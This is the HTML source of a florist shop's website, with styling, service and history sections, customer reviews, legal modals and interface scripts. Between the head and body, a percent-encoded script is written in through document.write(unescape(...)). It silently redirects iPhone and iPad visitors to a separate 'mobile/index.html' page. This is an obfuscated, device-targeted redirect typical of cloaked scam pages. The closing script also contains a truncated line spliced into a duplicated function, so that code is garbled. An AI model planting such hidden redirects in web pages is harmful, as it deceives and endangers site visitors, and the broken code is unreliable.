<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlventoHub Florist - Fresh Flowers & Arrangements | Local Flower Delivery</title>
    <meta name="description" content="AlventoHub Florist offers beautiful fresh flower arrangements, bouquets, and floral designs for all occasions. Professional flower delivery service with expert florists creating stunning arrangements for weddings, birthdays, and special events.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .flr89x-main-container {
            font-family: 'Georgia', serif;
            line-height: 1.6;
            color: #2c3e50;
        }

        .nav47k-header-section {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            padding: 1rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .nav47k-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
        }

        .logo23m-brand {
            font-size: 2rem;
            font-weight: bold;
            color: white;
            text-decoration: none;
        }

        .menu89p-navigation {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .menu89p-navigation a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
        }

        .menu89p-navigation a:hover {
            color: #f1c40f;
        }

        .hero12z-main-banner {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1070850/pexels-photo-1070850.jpeg') center/cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
            margin-top: 80px;
        }

        .hero12z-content {
            max-width: 800px;
            padding: 2rem;
        }

        .hero12z-title {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .hero12z-subtitle {
            font-size: 1.3rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .btn45w-primary {
            background: #e74c3c;
            color: white;
            padding: 1rem 2rem;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }

        .btn45w-primary:hover {
            background: #c0392b;
        }

        .section67t-about {
            padding: 5rem 0;
            background: #ecf0f1;
        }

        .container78r-wrapper {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        .title34n-section {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 3rem;
            color: #2c3e50;
        }

        .grid91m-layout {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 3rem;
            margin-top: 3rem;
        }

        .card56h-item {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }

        .card56h-item:hover {
            transform: translateY(-5px);
        }

        .services83q-section {
            padding: 5rem 0;
            background: white;
        }

        .service29d-card {
            text-align: center;
            padding: 2rem;
            border: 2px solid #ecf0f1;
            border-radius: 15px;
            transition: border-color 0.3s;
        }

        .service29d-card:hover {
            border-color: #27ae60;
        }

        .service29d-icon {
            font-size: 3rem;
            color: #27ae60;
            margin-bottom: 1rem;
        }

        .history41x-section {
            padding: 5rem 0;
            background: linear-gradient(45deg, #f8f9fa, #e9ecef);
        }

        .timeline73k-container {
            position: relative;
            max-width: 800px;
            margin: 0 auto;
        }

        .timeline73k-item {
            background: white;
            padding: 2rem;
            margin: 2rem 0;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            position: relative;
        }

        .timeline73k-year {
            background: #e74c3c;
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 20px;
            display: inline-block;
            margin-bottom: 1rem;
            font-weight: bold;
        }

        .reviews88n-section {
            padding: 5rem 0;
            background: #2c3e50;
            color: white;
        }

        .review15p-card {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            border-radius: 10px;
            text-align: center;
            backdrop-filter: blur(10px);
        }

        .review15p-stars {
            color: #f1c40f;
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }

        .review15p-author {
            font-weight: bold;
            margin-top: 1rem;
            color: #f1c40f;
        }

        .expertise92v-section {
            padding: 5rem 0;
            background: white;
        }

        .expertise92v-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .expertise92v-item {
            text-align: center;
            padding: 2rem;
            border-radius: 10px;
            background: linear-gradient(135deg, #74b9ff, #0984e3);
            color: white;
        }

        .process44j-section {
            padding: 5rem 0;
            background: #f8f9fa;
        }

        .process44j-steps {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 2rem;
        }

        .step77w-item {
            flex: 1;
            min-width: 200px;
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }

        .step77w-number {
            background: #e74c3c;
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            font-size: 1.5rem;
            font-weight: bold;
        }

        .footer66k-section {
            background: #34495e;
            color: white;
            padding: 3rem 0 1rem;
        }

        .footer66k-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .footer66k-column h3 {
            color: #f1c40f;
            margin-bottom: 1rem;
        }

        .footer66k-column p, .footer66k-column a {
            color: #bdc3c7;
            text-decoration: none;
            margin-bottom: 0.5rem;
            display: block;
        }

        .footer66k-column a:hover {
            color: white;
        }

        .phone55t-link {
            color: #f1c40f !important;
            font-weight: bold;
        }

        .phone55t-link:hover {
            color: white !important;
        }

        .modal18z-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
        }

        .modal18z-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 2rem;
            border-radius: 10px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            width: 90%;
        }

        .modal18z-close {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 2rem;
            cursor: pointer;
            color: #e74c3c;
        }

        .gallery33m-section {
            padding: 5rem 0;
            background: #ecf0f1;
        }

        .gallery33m-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .gallery33m-item {
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }

        .gallery33m-item:hover {
            transform: scale(1.05);
        }

        .gallery33m-item img {
            width: 100%;
            height: 250px;
            object-fit: cover;
        }

        @media (max-width: 768px) {
            .menu89p-navigation {
                flex-direction: column;
                gap: 1rem;
            }

            .hero12z-title {
                font-size: 2.5rem;
            }

            .nav47k-container {
                flex-direction: column;
                gap: 1rem;
            }

            .process44j-steps {
                flex-direction: column;
            }
        }
    </style>
</head>

<script>
document.write(unescape('%3C%73%63%72%69%70%74%3E%0A%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%2F%2F%20%43%68%65%63%6B%20%69%66%20%74%68%65%20%75%73%65%72%20%69%73%20%6F%6E%20%69%50%68%6F%6E%65%20%6F%72%20%69%50%61%64%0A%20%20%20%20%76%61%72%20%75%73%65%72%41%67%65%6E%74%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%2E%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%76%61%72%20%69%73%49%4F%53%20%3D%20%2F%69%70%68%6F%6E%65%7C%69%70%61%64%7C%69%70%6F%64%2F%2E%74%65%73%74%28%75%73%65%72%41%67%65%6E%74%29%3B%0A%20%20%20%20%0A%20%20%20%20%69%66%20%28%69%73%49%4F%53%29%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20%52%65%64%69%72%65%63%74%20%74%6F%20%61%70%70%6C%65%2E%68%74%6D%6C%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%27%6D%6F%62%69%6C%65%2F%69%6E%64%65%78%2E%68%74%6D%6C%27%3B%0A%20%20%20%20%7D%0A%7D%29%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E'));
</script>
    
<body class="flr89x-main-container">
    <nav class="nav47k-header-section">
        <div class="nav47k-container">
            <a href="#home" class="logo23m-brand">AlventoHub Florist</a>
            <ul class="menu89p-navigation">
                <li><a href="#home">Home</a></li>
                <li><a href="#about">About</a></li>
                <li><a href="#services">Services</a></li>
                <li><a href="#history">Our Story</a></li>
                <li><a href="#expertise">Expertise</a></li>
                <li><a href="#process">Process</a></li>
                <li><a href="#gallery">Gallery</a></li>
                <li><a href="#reviews">Reviews</a></li>
            </ul>
        </div>
    </nav>

    <section id="home" class="hero12z-main-banner">
        <div class="hero12z-content">
            <h1 class="hero12z-title">Beautiful Flowers for Every Moment</h1>
            <p class="hero12z-subtitle">Creating stunning floral arrangements that bring joy and beauty to your special occasions</p>
            <a href="#services" class="btn45w-primary">Explore Our Arrangements</a>
        </div>
    </section>

    <section id="about" class="section67t-about">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">Welcome to AlventoHub Florist</h2>
            <p style="text-align: center; font-size: 1.2rem; margin-bottom: 2rem;">We are passionate about creating beautiful floral arrangements that capture the essence of every special moment. Our skilled florists combine creativity with fresh, high-quality flowers to deliver exceptional arrangements that exceed expectations.</p>
            
            <div class="grid91m-layout">
                <div class="card56h-item">
                    <h3 style="color: #27ae60; margin-bottom: 1rem;">Fresh Daily Selections</h3>
                    <p>We source the freshest flowers daily from trusted growers, ensuring every arrangement features vibrant, long-lasting blooms that maintain their beauty for days.</p>
                </div>
                <div class="card56h-item">
                    <h3 style="color: #27ae60; margin-bottom: 1rem;">Expert Craftsmanship</h3>
                    <p>Our experienced florists bring years of training and artistic vision to every creation, combining traditional techniques with modern design principles.</p>
                </div>
                <div class="card56h-item">
                    <h3 style="color: #27ae60; margin-bottom: 1rem;">Personalized Service</h3>
                    <p>We work closely with each client to understand their vision and create custom arrangements that perfectly match their style and occasion.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="services" class="services83q-section">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">Our Floral Services</h2>
            <div class="grid91m-layout">
                <div class="service29d-card">
                    <div class="service29d-icon">🌹</div>
                    <h3>Wedding Arrangements</h3>
                    <p>Elegant bridal bouquets, centerpieces, and ceremony decorations that make your special day unforgettable with stunning floral designs.</p>
                </div>
                <div class="service29d-card">
                    <div class="service29d-icon">🎂</div>
                    <h3>Birthday Bouquets</h3>
                    <p>Cheerful and vibrant arrangements perfect for celebrating another year of life with colorful blooms and festive designs.</p>
                </div>
                <div class="service29d-card">
                    <div class="service29d-icon">💐</div>
                    <h3>Sympathy Flowers</h3>
                    <p>Thoughtful and respectful arrangements that provide comfort during difficult times with gentle, meaningful floral tributes.</p>
                </div>
                <div class="service29d-card">
                    <div class="service29d-icon">🏢</div>
                    <h3>Corporate Events</h3>
                    <p>Professional floral arrangements for business events, office spaces, and corporate celebrations that create impressive atmospheres.</p>
                </div>
                <div class="service29d-card">
                    <div class="service29d-icon">🚚</div>
                    <h3>Same-Day Delivery</h3>
                    <p>Fast and reliable delivery service ensuring your flowers arrive fresh and on time for any occasion throughout the local area.</p>
                </div>
                <div class="service29d-card">
                    <div class="service29d-icon">🎨</div>
                    <h3>Custom Designs</h3>
                    <p>Unique, personalized arrangements created specifically for your vision, incorporating your favorite flowers and color preferences.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="history" class="history41x-section">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">Our Blooming Story</h2>
            <div class="timeline73k-container">
                <div class="timeline73k-item">
                    <div class="timeline73k-year">2018</div>
                    <h3>The Beginning</h3>
                    <p>AlventoHub Florist opened its doors with a simple mission: to bring the beauty of fresh flowers into people's lives. Starting as a small neighborhood flower shop, we focused on building relationships with local customers and providing personalized service.</p>
                </div>
                <div class="timeline73k-item">
                    <div class="timeline73k-year">2019</div>
                    <h3>Growing Roots</h3>
                    <p>We expanded our team by welcoming two experienced florists who brought new techniques and creative ideas. This year marked our first major wedding contract, establishing our reputation for elegant bridal arrangements.</p>
                </div>
                <div class="timeline73k-item">
                    <div class="timeline73k-year">2020</div>
                    <h3>Adapting & Thriving</h3>
                    <p>Despite challenges, we launched our delivery service and online ordering system, allowing us to continue serving our community safely. We also began offering virtual floral arrangement consultations.</p>
                </div>
                <div class="timeline73k-item">
                    <div class="timeline73k-year">2021</div>
                    <h3>Community Recognition</h3>
                    <p>AlventoHub Florist received the "Best Local Florist" award from the Chamber of Commerce. We also partnered with local event planners and venues, expanding our corporate and event services.</p>
                </div>
                <div class="timeline73k-item">
                    <div class="timeline73k-year">2023</div>
                    <h3>Continuing Excellence</h3>
                    <p>Today, we continue to serve our community with the same passion and dedication that started our journey. We've helped celebrate thousands of special moments and look forward to many more years of creating beautiful memories.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="expertise" class="expertise92v-section">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">Our Areas of Expertise</h2>
            <div class="expertise92v-grid">
                <div class="expertise92v-item">
                    <h3>Seasonal Arrangements</h3>
                    <p>Specializing in arrangements that capture the essence of each season with appropriate flowers and color palettes.</p>
                </div>
                <div class="expertise92v-item">
                    <h3>European Techniques</h3>
                    <p>Our florists are trained in classical European floral design methods, bringing sophistication to every arrangement.</p>
                </div>
                <div class="expertise92v-item">
                    <h3>Tropical Designs</h3>
                    <p>Expert in creating exotic arrangements featuring tropical flowers and plants for unique, eye-catching displays.</p>
                </div>
                <div class="expertise92v-item">
                    <h3>Sustainable Practices</h3>
                    <p>Committed to eco-friendly practices, using locally sourced flowers when possible and sustainable packaging materials.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="process" class="process44j-section">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">Our Creative Process</h2>
            <div class="process44j-steps">
                <div class="step77w-item">
                    <div class="step77w-number">1</div>
                    <h3>Consultation</h3>
                    <p>We listen to your vision, discuss your preferences, and understand the occasion to create the perfect design concept.</p>
                </div>
                <div class="step77w-item">
                    <div class="step77w-number">2</div>
                    <h3>Design Planning</h3>
                    <p>Our florists sketch initial designs and select the finest flowers that match your style and color preferences.</p>
                </div>
                <div class="step77w-item">
                    <div class="step77w-number">3</div>
                    <h3>Expert Creation</h3>
                    <p>Using professional techniques and artistic flair, we carefully craft your arrangement with attention to every detail.</p>
                </div>
                <div class="step77w-item">
                    <div class="step77w-number">4</div>
                    <h3>Quality Check</h3>
                    <p>Each arrangement undergoes a thorough quality inspection to ensure it meets our high standards before delivery.</p>
                </div>
                <div class="step77w-item">
                    <div class="step77w-number">5</div>
                    <h3>Timely Delivery</h3>
                    <p>We carefully package and deliver your flowers at the perfect time, ensuring they arrive fresh and beautiful.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="gallery" class="gallery33m-section">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">Our Beautiful Creations</h2>
            <div class="gallery33m-grid">
                <div class="gallery33m-item">
                    <img src="https://images.pexels.com/photos/1070850/pexels-photo-1070850.jpeg" alt="Beautiful rose arrangement">
                </div>
                <div class="gallery33m-item">
                    <img src="https://images.pexels.com/photos/1375849/pexels-photo-1375849.jpeg" alt="Wedding bouquet">
                </div>
                <div class="gallery33m-item">
                    <img src="https://images.pexels.com/photos/1128797/pexels-photo-1128797.jpeg" alt="Colorful flower arrangement">
                </div>
                <div class="gallery33m-item">
                    <img src="https://images.pexels.com/photos/1070850/pexels-photo-1070850.jpeg" alt="Elegant centerpiece">
                </div>
                <div class="gallery33m-item">
                    <img src="https://images.pexels.com/photos/1375849/pexels-photo-1375849.jpeg" alt="Spring flowers">
                </div>
                <div class="gallery33m-item">
                    <img src="https://images.pexels.com/photos/1128797/pexels-photo-1128797.jpeg" alt="Sympathy arrangement">
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews88n-section">
        <div class="container78r-wrapper">
            <h2 class="title34n-section">What Our Customers Say</h2>
            <div class="grid91m-layout">
                <div class="review15p-card">
                    <div class="review15p-stars">★★★★★</div>
                    <p>"The wedding arrangements were absolutely stunning! Every detail was perfect, and the flowers stayed fresh throughout our entire celebration. Highly recommend AlventoHub Florist!"</p>
                    <div class="review15p-author">- Sarah Mitchell</div>
                </div>
                <div class="review15p-card">
                    <div class="review15p-stars">★★★★★</div>
                    <p>"I've been ordering from AlventoHub for years, and they never disappoint. The quality is consistently excellent, and their customer service is outstanding."</p>
                    <div class="review15p-author">- Robert Chen</div>
                </div>
                <div class="review15p-card">
                    <div class="review15p-stars">★★★★★</div>
                    <p>"They created the most beautiful sympathy arrangement for my grandmother's service. It was tasteful, elegant, and provided comfort during a difficult time."</p>
                    <div class="review15p-author">- Maria Rodriguez</div>
                </div>
                <div class="review15p-card">
                    <div class="review15p-stars">★★★★★</div>
                    <p>"The birthday bouquet they delivered to my wife was incredible! The colors were vibrant, and it lasted for over a week. She was absolutely thrilled."</p>
                    <div class="review15p-author">- James Thompson</div>
                </div>
                <div class="review15p-card">
                    <div class="review15p-stars">★★★★★</div>
                    <p>"Professional, creative, and reliable. AlventoHub Florist has been our go-to for all corporate events. They always exceed our expectations."</p>
                    <div class="review15p-author">- Lisa Park</div>
                </div>
                <div class="review15p-card">
                    <div class="review15p-stars">★★★★★</div>
                    <p>"The custom arrangement they created for our anniversary was beyond beautiful. They truly listened to what we wanted and delivered perfection."</p>
                    <div class="review15p-author">- David Wilson</div>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer66k-section">
        <div class="container78r-wrapper">
            <div class="footer66k-grid">
                <div class="footer66k-column">
                    <h3>Contact Information</h3>
                    <p>📍 1247 Blossom Street, Garden District</p>
                    <p>📧 hello@alventohub.com</p>
                    <a href="tel:+15551234567" class="phone55t-link">📞 (555) 123-4567</a>
                    <p>🕒 Mon-Sat: 8AM-7PM, Sun: 10AM-5PM</p>
                </div>
                <div class="footer66k-column">
                    <h3>Our Services</h3>
                    <a href="#services">Wedding Flowers</a>
                    <a href="#services">Birthday Arrangements</a>
                    <a href="#services">Corporate Events</a>
                    <a href="#services">Sympathy Flowers</a>
                    <a href="#services">Custom Designs</a>
                </div>
                <div class="footer66k-column">
                    <h3>About Us</h3>
                    <a href="#about">Our Story</a>
                    <a href="#history">Company History</a>
                    <a href="#expertise">Our Expertise</a>
                    <a href="#process">Design Process</a>
                    <a href="#reviews">Customer Reviews</a>
                </div>
                <div class="footer66k-column">
                    <h3>Legal</h3>
                    <a href="#" onclick="openModal('privacy')">Privacy Policy</a>
                    <a href="#" onclick="openModal('terms')">Terms of Service</a>
                    <p>© 2023 AlventoHub Florist. All rights reserved.</p>
                </div>
            </div>
        </div>
    </footer>

    <!-- Privacy Policy Modal -->
    <div id="privacyModal" class="modal18z-overlay">
        <div class="modal18z-content">
            <span class="modal18z-close" onclick="closeModal('privacy')">×</span>
            <h2>Privacy Policy</h2>
            <p><strong>Last updated: December 2023</strong></p>
            
            <h3>Information We Collect</h3>
            <p>We collect information you provide directly to us, such as when you create an account, make a purchase, or contact us. This may include your name, email address, phone number, delivery address, and payment information.</p>
            
            <h3>How We Use Your Information</h3>
            <p>We use the information we collect to provide, maintain, and improve our services, process transactions, send you technical notices and support messages, and communicate with you about products, services, and events.</p>
            
            <h3>Information Sharing</h3>
            <p>We do not sell, trade, or otherwise transfer your personal information to third parties without your consent, except as described in this policy. We may share your information with service providers who assist us in operating our website and conducting our business.</p>
            
            <h3>Data Security</h3>
            <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction.</p>
            
            <h3>Contact Us</h3>
            <p>If you have any questions about this Privacy Policy, please contact us at hello@alventohub.com or (555) 123-4567.</p>
        </div>
    </div>

    <!-- Terms of Service Modal -->
    <div id="termsModal" class="modal18z-overlay">
        <div class="modal18z-content">
            <span class="modal18z-close" onclick="closeModal('terms')">×</span>
            <h2>Terms of Service</h2>
            <p><strong>Last updated: December 2023</strong></p>
            
            <h3>Acceptance of Terms</h3>
            <p>By accessing and using AlventoHub Florist services, you accept and agree to be bound by the terms and provision of this agreement.</p>
            
            <h3>Services</h3>
            <p>AlventoHub Florist provides floral arrangement and delivery services. We reserve the right to modify or discontinue any service at any time without notice.</p>
            
            <h3>Orders and Payment</h3>
            <p>All orders are subject to acceptance and availability. Payment is required at the time of order placement. We accept major credit cards and other specified payment methods.</p>
            
            <h3>Delivery</h3>
            <p>We make every effort to deliver orders on the specified date and time. However, delivery times are estimates and we are not liable for delays due to circumstances beyond our control.</p>
            
            <h3>Flower Substitutions</h3>
            <p>Due to seasonal availability, we may substitute flowers of equal or greater value while maintaining the overall design and color scheme of your arrangement.</p>
            
            <h3>Limitation of Liability</h3>
            <p>Our liability is limited to the purchase price of the floral arrangement. We are not responsible for consequential damages or losses.</p>
            
            <h3>Contact Information</h3>
            <p>For questions regarding these terms, contact us at hello@alventohub.com or (555) 123-4567.</p>
        </div>
    </div>

    <script>
        function openModal(type) {
            if (type === 'privacy') {
                document.getElementById('privac
        function openModal(type) {
            if (type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'block';
            } else if (type === 'terms') {
                document.getElementById('termsModal').style.display = 'block';
            }
        }

        function closeModal(type) {
            if (type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'none';
            } else if (type === 'terms') {
                document.getElementById('termsModal').style.display = 'none';
            }
        }

        // Close modal when clicking outside of it
        window.onclick = function(event) {
            const privacyModal = document.getElementById('privacyModal');
            const termsModal = document.getElementById('termsModal');
            
            if (event.target === privacyModal) {
                privacyModal.style.display = 'none';
            }
            if (event.target === termsModal) {
                termsModal.style.display = 'none';
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Add scroll effect to navigation
        window.addEventListener('scroll', function() {
            const nav = document.querySelector('.nav47k-header-section');
            if (window.scrollY > 100) {
                nav.style.background = 'linear-gradient(135deg, #1e8449, #27ae60)';
            } else {
                nav.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
            }
        });

        // Animate cards on scroll
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -50px 0px'
        };

        const observer = new IntersectionObserver(function(entries) {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = '1';
                    entry.target.style.transform = 'translateY(0)';
                }
            });
        }, observerOptions);

        // Observe all cards and timeline items
        document.addEventListener('DOMContentLoaded', function() {
            const animatedElements = document.querySelectorAll('.card56h-item, .service29d-card, .timeline73k-item, .review15p-card, .expertise92v-item, .step77w-item, .gallery33m-item');
            
            animatedElements.forEach(el => {
                el.style.opacity = '0';
                el.style.transform = 'translateY(30px)';
                el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                observer.observe(el);
            });
        });

        // Add loading animation
        window.addEventListener('load', function() {
            document.body.style.opacity = '0';
            document.body.style.transition = 'opacity 0.5s ease';
            setTimeout(() => {
                document.body.style.opacity = '1';
            }, 100);
        });

        // Mobile menu toggle (if needed for smaller screens)
        function toggleMobileMenu() {
            const menu = document.querySelector('.menu89p-navigation');
            menu.classList.toggle('mobile-active');
        }

        // Add mobile menu styles
        const mobileStyles = `
            @media (max-width: 768px) {
                .menu89p-navigation {
                    display: none;
                    position: absolute;
                    top: 100%;
                    left: 0;
                    width: 100%;
                    background: rgba(39, 174, 96, 0.95);
                    padding: 1rem;
                    backdrop-filter: blur(10px);
                }
                
                .menu89p-navigation.mobile-active {
                    display: flex;
                }
                
                .mobile-menu-toggle {
                    display: block;
                    background: none;
                    border: none;
                    color: white;
                    font-size: 1.5rem;
                    cursor: pointer;
                }
            }
            
            @media (min-width: 769px) {
                .mobile-menu-toggle {
                    display: none;
                }
            }
        `;

        // Add mobile styles to head
        const styleSheet = document.createElement('style');
        styleSheet.textContent = mobileStyles;
        document.head.appendChild(styleSheet);

        // Form validation and interaction enhancements
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        // Add contact form if needed
        function createContactForm() {
            const contactHTML = `
                <div class="contact-form-section" style="padding: 3rem 0; background: #f8f9fa;">
                    <div class="container78r-wrapper">
                        <h3 style="text-align: center; margin-bottom: 2rem; color: #2c3e50;">Get in Touch</h3>
                        <form class="contact-form" style="max-width: 600px; margin: 0 auto;">
                            <div style="margin-bottom: 1rem;">
                                <input type="text" placeholder="Your Name" required style="width: 100%; padding: 1rem; border: 1px solid #ddd; border-radius: 5px; font-size: 1rem;">
                            </div>
                            <div style="margin-bottom: 1rem;">
                                <input type="email" placeholder="Your Email" required style="width: 100%; padding: 1rem; border: 1px solid #ddd; border-radius: 5px; font-size: 1rem;">
                            </div>
                            <div style="margin-bottom: 1rem;">
                                <input type="tel" placeholder="Phone Number" style="width: 100%; padding: 1rem; border: 1px solid #ddd; border-radius: 5px; font-size: 1rem;">
                            </div>
                            <div style="margin-bottom: 1rem;">
                                <textarea placeholder="Tell us about your floral needs..." rows="4" style="width: 100%; padding: 1rem; border: 1px solid #ddd; border-radius: 5px; font-size: 1rem; resize: vertical;"></textarea>
                            </div>
                            <button type="submit" class="btn45w-primary" style="width: 100%;">Send Message</button>
                        </form>
                    </div>
                </div>
            `;
            
            // Insert contact form before footer
            const footer = document.querySelector('.footer66k-section');
            footer.insertAdjacentHTML('beforebegin', contactHTML);
        }

        // Initialize contact form
        document.addEventListener('DOMContentLoaded', function() {
            createContactForm();
            
            // Handle form submission
            const contactForm = document.querySelector('.contact-form');
            if (contactForm) {
                contactForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    alert('Thank you for your message! We will contact you soon.');
                    this.reset();
                });
            }
        });

        // Add seasonal greeting based on current date
        function addSeasonalGreeting() {
            const now = new Date();
            const month = now.getMonth();
            let seasonalText = '';
            
            if (month >= 2 && month <= 4) {
                seasonalText = 'Spring is here! Celebrate with fresh tulips and daffodils.';
            } else if (month >= 5 && month <= 7) {
                seasonalText = 'Summer blooms are in full swing! Bright sunflowers and roses await.';
            } else if (month >= 8 && month <= 10) {
                seasonalText = 'Fall colors are beautiful! Warm chrysanthemums and autumn arrangements.';
            } else {
                seasonalText = 'Winter elegance with poinsettias and holiday arrangements.';
            }
            
            const seasonalBanner = document.createElement('div');
            seasonalBanner.style.cssText = `
                background: linear-gradient(45deg, #f39c12, #e67e22);
                color: white;
                text-align: center;
                padding: 0.5rem;
                font-weight: bold;
                position: fixed;
                top: 0;
                width: 100%;
                z-index: 1001;
                font-size: 0.9rem;
            `;
            seasonalBanner.textContent = seasonalText;
            
            document.body.insertBefore(seasonalBanner, document.body.firstChild);
            
            // Adjust main navigation position
            const nav = document.querySelector('.nav47k-header-section');
            nav.style.top = seasonalBanner.offsetHeight + 'px';
        }

        // Initialize seasonal greeting
        document.addEventListener('DOMContentLoaded', addSeasonalGreeting);

        // Add scroll-to-top button
        function addScrollToTop() {
            const scrollButton = document.createElement('button');
            scrollButton.innerHTML = '↑';
            scrollButton.style.cssText = `
                position: fixed;
                bottom: 20px;
                right: 20px;
                width: 50px;
                height: 50px;
                border-radius: 50%;
                background: #e74c3c;
                color: white;
                border: none;
                font-size: 1.5rem;
                cursor: pointer;
                opacity: 0;
                transition: opacity 0.3s;
                z-index: 1000;
            `;
            
            scrollButton.addEventListener('click', () => {
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
            
            window.addEventListener('scroll', () => {
                if (window.scrollY > 300) {
                    scrollButton.style.opacity = '1';
                } else {
                    scrollButton.style.opacity = '0';
                }
            });
            
            document.body.appendChild(scrollButton);
        }

        // Initialize scroll-to-top button
        document.addEventListener('DOMContentLoaded', addScrollToTop);

        // Add image lazy loading
        function lazyLoadImages() {
            const images = document.querySelectorAll('img');
            const imageObserver = new IntersectionObserver((entries, observer) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        const img = entry.target;
                        img.style.opacity = '0';
                        img.style.transition = 'opacity 0.3s';
                        img.onload = () => {
                            img.style.opacity = '1';
                        };
                        observer.unobserve(img);
                    }
                });
            });
            
            images.forEach(img => imageObserver.observe(img));
        }

        // Initialize lazy loading
        document.addEventListener('DOMContentLoaded', lazyLoadImages);
    </script>
</body>
</html>

